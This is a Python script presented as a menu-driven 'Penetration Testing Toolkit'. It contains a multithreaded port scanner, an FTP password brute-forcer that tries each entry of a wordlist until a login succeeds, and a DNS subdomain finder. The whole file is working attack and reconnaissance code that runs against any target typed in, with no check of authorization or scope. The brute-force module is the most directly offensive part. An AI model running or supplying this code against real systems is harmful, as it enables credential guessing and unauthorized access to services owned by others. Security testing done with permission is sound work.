import socket
import ftplib
import dns.resolver
from concurrent.futures import ThreadPoolExecutor

# Improved Port Scanner
def scan_port(target, port):
    """Scan a single port."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect((target, port))
            return port, True
    except:
        return port, False

def port_scanner():
    """Improved Port Scanner with better output and control."""
    target = input("Enter target IP or domain: ").strip()
    start_port = int(input("Enter start port: "))
    end_port = int(input("Enter end port: "))

    print(f"\nScanning {target} for open ports from {start_port} to {end_port}...\n")
    open_ports = []

    # Scan ports using multithreading
    with ThreadPoolExecutor(max_workers=100) as executor:
        results = executor.map(lambda p: scan_port(target, p), range(start_port, end_port + 1))

    # Process results
    for port, is_open in results:
        if is_open:
            print(f"Port {port} is OPEN")
            open_ports.append(port)

    if not open_ports:
        print("No open ports found in the specified range.")
    else:
        print("\nOpen Ports Summary:")
        for port in open_ports:
            print(f"- Port {port}")

# Improved Brute-Force Attack Module
def brute_forcer():
    """Brute-Force Module for FTP with better error handling and control."""
    target = input("Enter target IP: ").strip()
    username = input("Enter username: ").strip()
    password_file = input("Enter path to password file: ").strip()

    try:
        with open(password_file, 'r') as file:
            passwords = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print("Password file not found.")
        return

    print(f"\nStarting brute-force attack on FTP server at {target}...\n")
    for password in passwords:
        try:
            print(f"Trying {password}...")
            ftp = ftplib.FTP(target)
            ftp.login(user=username, passwd=password)
            print(f"Success! Password found: {password}")
            ftp.quit()
            return  # Exit once the correct password is found
        except ftplib.error_perm:
            print(f"Failed: {password}")
        except Exception as e:
            print(f"Error: {e}")
            break  # Stop the attack if an unexpected error occurs

    print("Password not found in the provided list.")

# Improved Subdomain Finder
def subdomain_finder():
    """Subdomain Finder with expanded wordlist and error handling."""
    domain = input("Enter domain: ").strip()
    subdomains = [
        "www", "mail", "ftp", "blog", "api", "dev", "test", "staging", "admin", "shop", "news", "support"
    ]

    print(f"\nFinding subdomains for {domain}...\n")
    found_subdomains = []

    for subdomain in subdomains:
        try:
            full_domain = f"{subdomain}.{domain}"
            dns.resolver.resolve(full_domain, 'A')
            print(f"Found subdomain: {full_domain}")
            found_subdomains.append(full_domain)
        except dns.resolver.NXDOMAIN:
            continue
        except dns.resolver.Timeout:
            print(f"Timeout resolving {full_domain}. Skipping.")
        except Exception as e:
            print(f"Error resolving {full_domain}: {e}")

    if not found_subdomains:
        print("\nNo subdomains found.")
    else:
        print("\nFound Subdomains Summary:")
        for sub in found_subdomains:
            print(f"- {sub}")

# Menu-Driven Toolkit
def main():
    while True:
        print("\nPenetration Testing Toolkit")
        print("1. Port Scanner")
        print("2. Brute-Force Attack")
        print("3. Subdomain Finder")
        print("4. Exit")

        choice = input("Enter your choice: ").strip()
        if choice == "1":
            port_scanner()
        elif choice == "2":
            brute_forcer()
        elif choice == "3":
            subdomain_finder()
        elif choice == "4":
            print("Exiting toolkit.")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()
